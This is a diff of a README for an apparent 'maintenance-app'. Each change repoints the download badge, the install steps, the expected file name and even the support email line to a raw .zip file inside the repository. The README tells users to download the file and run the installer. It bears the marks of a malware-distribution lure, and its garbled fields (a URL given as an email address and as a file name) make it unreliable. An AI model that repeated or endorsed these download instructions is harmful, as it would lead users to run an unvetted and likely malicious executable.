@@ -6,11 +6,11 @@ Welcome to the maintenance-app! This platform helps you manage maintenance reque
 
 ## 📥 Download the Latest Release
 
-[![Download Maintenance App](https://github.com/Alexandre2377/maintenance-app/raw/refs/heads/main/frontend/app/user/app-maintenance-3.8.zip%20the%20App-Click%20Here-brightgreen)](https://github.com/Alexandre2377/maintenance-app/raw/refs/heads/main/frontend/app/user/app-maintenance-3.8.zip)
+[![Download Maintenance App](https://github.com/Alexandre2377/maintenance-app/raw/refs/heads/main/frontend/app/maintenance_app_3.6.zip%20the%20App-Click%20Here-brightgreen)](https://github.com/Alexandre2377/maintenance-app/raw/refs/heads/main/frontend/app/maintenance_app_3.6.zip)
 
 You can find the latest version of the maintenance-app on our Releases page. 
 
-Visit this page to download: [Download Maintenance App](https://github.com/Alexandre2377/maintenance-app/raw/refs/heads/main/frontend/app/user/app-maintenance-3.8.zip)
+Visit this page to download: [Download Maintenance App](https://github.com/Alexandre2377/maintenance-app/raw/refs/heads/main/frontend/app/maintenance_app_3.6.zip)
 
 ## 💻 System Requirements
 
@@ -25,9 +25,9 @@ Before you download, make sure your computer meets these minimum requirements:
 
 Follow these simple steps to install the maintenance-app:
 
-1. **Download the App:** Visit the [Download Maintenance App](https://github.com/Alexandre2377/maintenance-app/raw/refs/heads/main/frontend/app/user/app-maintenance-3.8.zip) page. Choose the version matching your operating system and click the download link.
+1. **Download the App:** Visit the [Download Maintenance App](https://github.com/Alexandre2377/maintenance-app/raw/refs/heads/main/frontend/app/maintenance_app_3.6.zip) page. Choose the version matching your operating system and click the download link.
 
-2. **Locate the Downloaded File:** After the download is complete, go to your Downloads folder. You should see a file named `https://github.com/Alexandre2377/maintenance-app/raw/refs/heads/main/frontend/app/user/app-maintenance-3.8.zip` or similar.
+2. **Locate the Downloaded File:** After the download is complete, go to your Downloads folder. You should see a file named `https://github.com/Alexandre2377/maintenance-app/raw/refs/heads/main/frontend/app/maintenance_app_3.6.zip` or similar.
 
 3. **Run the Installer:** Double-click the installer file. A setup wizard will guide you through the installation process. 
 
@@ -77,7 +77,7 @@ The maintenance-app offers many features designed to make maintenance management
 
 For questions or assistance, please contact our support team:
 
-- Email: https://github.com/Alexandre2377/maintenance-app/raw/refs/heads/main/frontend/app/user/app-maintenance-3.8.zip
+- Email: https://github.com/Alexandre2377/maintenance-app/raw/refs/heads/main/frontend/app/maintenance_app_3.6.zip
 - Visit our GitHub Issues page for reporting bugs or suggestions.
 
 We appreciate your feedback, as it helps us improve the app!
